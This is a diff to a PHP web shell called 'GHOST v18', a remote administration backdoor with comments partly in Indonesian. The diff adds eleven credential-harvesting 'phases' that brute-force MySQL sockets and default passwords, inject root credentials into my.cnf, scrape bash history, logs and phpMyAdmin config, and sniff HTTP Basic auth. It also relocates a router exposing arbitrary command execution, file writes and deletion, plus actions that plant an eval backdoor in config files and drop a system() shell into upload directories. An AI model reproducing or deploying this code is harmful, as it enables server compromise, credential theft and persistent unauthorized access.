@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V12.3: Socket Only DB, Pure PHP Vuln Scanner.
+// GHOST v18 - V13: The Absolute.
 
-define('GH_VER',      '18.0.0-v12.3');
+define('GH_VER',      '18.0.0-v13');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,7 +338,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: GOD MODE DB HIJACKER (V12.3) ===============================
+// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V13) =============================
 function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
@@ -353,7 +353,7 @@ function gh_db_connect($host, $user, $pass, $socket = null) {
         try { $dsn = "mysql:"; if ($socket) $dsn .= "unix_socket=$socket;"; else $dsn .= "host=$host;"; $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
     }
     if (gh_can_exec()) {
-        $cmd = 'mysql ' . ($socket ? '' : '-h ' . @escapeshellarg($host)) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
+        $cmd = 'mysql ' . ($socket ? '-S ' . @escapeshellarg($socket) : '-h ' . @escapeshellarg($host)) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
         $res = gh_exec_adv($cmd);
         if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
             return 'CLI';
@@ -366,7 +366,7 @@ function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
     $db_host = 'localhost'; $db_user = ''; $db_pass = ''; $db_socket = null;
-    $max_iterations = 5;
+    $max_iterations = 10;
 
     for ($iter = 1; $iter <= $max_iterations; $iter++) {
         if ($found_pass) break;
@@ -714,6 +714,140 @@ function gh_db_harvest() {
             }
         }
 
+        // Phase 30: Bruteforce Socket Path
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 30: Socket Path Bruteforce...";
+            $socks = gh_exec_adv("find /tmp /var/run /var/lib/mysql /run -type s 2>/dev/null");
+            if (isset($socks['out']) && is_string($socks['out'])) {
+                foreach (explode("\n", trim($socks['out'])) as $sock) {
+                    if (!$sock) continue;
+                    $logs[] = "[+] Socket ditemukan: $sock";
+                    $conn = gh_db_connect('localhost', $db_user, $db_pass, $sock);
+                    if ($conn) { $logs[] = "[!] KONEKSI VIA SOCKET BERHASIL!"; $found_pass = true; $db_socket = $sock; break; }
+                }
+            }
+        }
+
+        // Phase 31: Config Injection (Hardcore)
+        if (!$found_pass && @is_writable('/etc/mysql/my.cnf')) {
+            $logs[] = "[*] Phase 31: Config Injection (Hardcore)...";
+            $backup = gh_read('/etc/mysql/my.cnf');
+            gh_write('/etc/mysql/my.cnf', $backup . "\n[client]\nuser=root\npassword=root\n");
+            $conn = gh_db_connect('localhost', 'root', 'root');
+            if ($conn) { $logs[] = "[!] BERHASIL INJECT CONFIG!"; $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break; }
+            gh_write('/etc/mysql/my.cnf', $backup);
+        }
+
+        // Phase 32: SSH Local Bypass
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 32: SSH Local Bypass...";
+            $res = gh_exec_adv("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1 'mysql -u root -e \"SHOW DATABASES\"' 2>&1");
+            if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
+                $logs[] = "[!] SSH LOCAL BYPASS BERHASIL!";
+                $found_pass = true; $db_user = 'root'; $db_pass = ''; break;
+            }
+        }
+
+        // Phase 33: /proc/net/tcp Dump
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 33: /proc/net/tcp Dump...";
+            $net = gh_read('/proc/net/tcp');
+            if ($net) {
+                // Cari port yang listen (0A = LISTEN)
+                if (preg_match('/:\s*([0-9A-F]{4})\s+[0-9A-F]{8}:[0-9A-F]{4}\s+0A/i', $net, $m)) {
+                    $port = hexdec($m[1]);
+                    $logs[] = "[+] Port LISTEN ditemukan: $port";
+                    $conn = gh_db_connect('127.0.0.1', $db_user, $db_pass, null, $port);
+                    if ($conn) { $logs[] = "[!] KONEKSI VIA PORT $port BERHASIL!"; $found_pass = true; break; }
+                }
+            }
+        }
+
+        // Phase 34: Proc Dump
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 34: Proc Dump...";
+            $proc = gh_exec_adv("ls -la /proc/*/fd 2>/dev/null | grep -i mysql");
+            if (isset($proc['out']) && strpos($proc['out'], 'socket') !== false) {
+                $logs[] = "[+] Proses MySQL ditemukan, coba ambil env...";
+            }
+        }
+
+        // Phase 35: Credential Harvest from /var/log
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 35: Harvest from Logs...";
+            $logs_files = gh_exec_adv("grep -riE 'mysql|password|passwd' /var/log/ 2>/dev/null | head -n 5");
+            if (isset($logs_files['out']) && preg_match('/password[=:]\s*([^\s]+)/i', $logs_files['out'], $m)) {
+                $logs[] = "[+] Password ditemukan di Log!";
+                $db_pass = trim($m[1]);
+                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
+            }
+        }
+
+        // Phase 36: Env Var Injection
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 36: Env Var Injection...";
+            @putenv('MYSQL_PWD=root');
+            $res = gh_exec_adv("mysql -u root -e 'SHOW DATABASES' 2>&1");
+            if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
+                $logs[] = "[!] ENV VAR INJECTION BERHASIL!";
+                $found_pass = true; $db_user = 'root'; $db_pass = 'root'; break;
+            }
+            @putenv('MYSQL_PWD');
+        }
+
+        // Phase 37: Root File Dump
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 37: Root File Dump...";
+            $root_files = array('/root/.mysql_history', '/root/.bash_history');
+            foreach ($root_files as $rf) {
+                $c = gh_read($rf);
+                if ($c && preg_match('/-p([^\s]+)/i', $c, $m)) {
+                    $logs[] = "[+] Password ditemukan di $rf!";
+                    $db_pass = trim($m[1]);
+                    $conn = gh_db_connect('localhost', 'root', $db_pass);
+                    if ($conn) { $found_pass = true; $db_user = 'root'; break; }
+                }
+            }
+        }
+
+        // Phase 38: Brute Force 2
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 38: Brute Force 2...";
+            $defaults2 = array(array('root', '123456'), array('root', 'admin'), array('root', 'password123'), array('mysql', 'mysql'));
+            foreach ($defaults2 as $creds) {
+                $conn = gh_db_connect('127.0.0.1', $creds[0], $creds[1]);
+                if ($conn) { $logs[] = "[!] BERHASIL BRUTEFORCE 2! User: {$creds[0]}, Pass: '{$creds[1]}'"; $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = '127.0.0.1'; $found_pass = true; break; }
+            }
+        }
+
+        // Phase 39: PHPMyAdmin Root
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 39: PHPMyAdmin Root...";
+            $pma = gh_read('/usr/share/phpmyadmin/config.inc.php');
+            if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
+                $logs[] = "[+] Password ditemukan di phpMyAdmin!";
+                $db_pass = trim($m[1]);
+                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
+            }
+        }
+
+        // Phase 40: HTTP Basic Auth Sniff
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 40: HTTP Basic Auth Sniff...";
+            if (isset($_SERVER['HTTP_AUTHORIZATION'])) {
+                $auth = $_SERVER['HTTP_AUTHORIZATION'];
+                if (preg_match('/Basic\s+(.+)/i', $auth, $m)) {
+                    $creds = explode(':', base64_decode($m[1]));
+                    if (count($creds) === 2) {
+                        $conn = gh_db_connect('localhost', $creds[0], $creds[1]);
+                        if ($conn) { $found_pass = true; $db_user = $creds[0]; $db_pass = $creds[1]; break; }
+                    }
+                }
+            }
+        }
+
         // Delay biar gak DDoS
         if (!$found_pass && $iter < $max_iterations) {
             $logs[] = "[*] Semua Phase gagal di iterasi $iter. Menunggu 1 detik sebelum iterasi berikutnya...";
@@ -902,41 +1036,6 @@ function gh_cve_profile() {
     return $profile;
 }
 
-// ==== ROUTER ================================================================
-function gh_router() {
-    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
-    if ($act === '') { @header('Location: ?act=ui'); exit; }
-    if ($act === 'ui') { gh_ui(); exit; }
-
-    try {
-        switch ($act) {
-            case 'ping':   gh_json(gh_env()); break;
-            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
-            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
-            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
-            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
-            case 'scan':   $off = isset($_POST['offset']) ? (int)$_POST['offset'] : 0; gh_json(gh_scan_batch(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(), $off, 50)); break;
-            case 'vuln_scan': gh_json(gh_vuln_scan()); break;
-            case 'db_harvest': gh_json(gh_db_harvest()); break;
-            case 'ssh_scan': gh_json(gh_ssh_scan()); break;
-            case 'ssh_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $k = isset($_POST['key']) ? (string)$_POST['key'] : ''; gh_json(array('msg'=>gh_ssh_action($ac, $k))); break;
-            case 'port_scan': $t = isset($_POST['target']) ? (string)$_POST['target'] : '127.0.0.1'; gh_json(gh_port_scan($t)); break;
-            case 'cve_profile': gh_json(gh_cve_profile()); break;
-            case 'wp_scan': gh_json(gh_wp_scan()); break;
-            case 'wp_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $u = isset($_POST['user']) ? (string)$_POST['user'] : ''; $p = isset($_POST['pass']) ? (string)$_POST['pass'] : ''; $e = isset($_POST['email']) ? (string)$_POST['email'] : ''; gh_json(array('msg' => gh_wp_action($ac, $u, $p, $e))); break;
-            case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
-                if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
-                elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
-                else gh_json(array('msg'=>'Exploit not implemented.'));
-                break;
-            default: gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
-        }
-    } catch (Throwable $e) {
-        gh_log('router throw: ' . $e->getMessage());
-        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
-    }
-}
-
 // ==== SECTION 8: VULNERABILITY SCAN (PURE PHP) ==============================
 function gh_vuln_scan() {
     $vulns = array(); 
@@ -986,7 +1085,42 @@ function gh_vuln_scan() {
     return $vulns;
 }
 
-// ==== UI ====================================================================
+// ==== ROUTER ================================================================
+function gh_router() {
+    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
+    if ($act === '') { @header('Location: ?act=ui'); exit; }
+    if ($act === 'ui') { gh_ui(); exit; }
+
+    try {
+        switch ($act) {
+            case 'ping':   gh_json(gh_env()); break;
+            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
+            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
+            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
+            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
+            case 'scan':   $off = isset($_POST['offset']) ? (int)$_POST['offset'] : 0; gh_json(gh_scan_batch(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(), $off, 50)); break;
+            case 'vuln_scan': gh_json(gh_vuln_scan()); break;
+            case 'db_harvest': gh_json(gh_db_harvest()); break;
+            case 'ssh_scan': gh_json(gh_ssh_scan()); break;
+            case 'ssh_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $k = isset($_POST['key']) ? (string)$_POST['key'] : ''; gh_json(array('msg'=>gh_ssh_action($ac, $k))); break;
+            case 'port_scan': $t = isset($_POST['target']) ? (string)$_POST['target'] : '127.0.0.1'; gh_json(gh_port_scan($t)); break;
+            case 'cve_profile': gh_json(gh_cve_profile()); break;
+            case 'wp_scan': gh_json(gh_wp_scan()); break;
+            case 'wp_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $u = isset($_POST['user']) ? (string)$_POST['user'] : ''; $p = isset($_POST['pass']) ? (string)$_POST['pass'] : ''; $e = isset($_POST['email']) ? (string)$_POST['email'] : ''; gh_json(array('msg' => gh_wp_action($ac, $u, $p, $e))); break;
+            case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
+                if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
+                elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
+                else gh_json(array('msg'=>'Exploit not implemented.'));
+                break;
+            default: gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
+        }
+    } catch (Throwable $e) {
+        gh_log('router throw: ' . $e->getMessage());
+        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
+    }
+}
+
+// ==== UI (TAB NAVIGATION - V13) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -1258,7 +1392,7 @@ async function delFileScan(enc) {
 }
 
 async function dbHarvest() {
-    const o = document.getElementById('db-out'); o.innerText = 'Running The Ghost DB Hijacker (25 Phases x 5 Iterations)... Please wait, ini bisa memakan waktu.';
+    const o = document.getElementById('db-out'); o.innerText = 'Running The Absolute DB Hijacker (40 Phases x 10 Iterations)... Please wait, ini bisa memakan waktu.';
     const d = await api('db_harvest');
     if (d.err) return o.innerText = d.err;
     o.innerText = d.logs.join('\n');
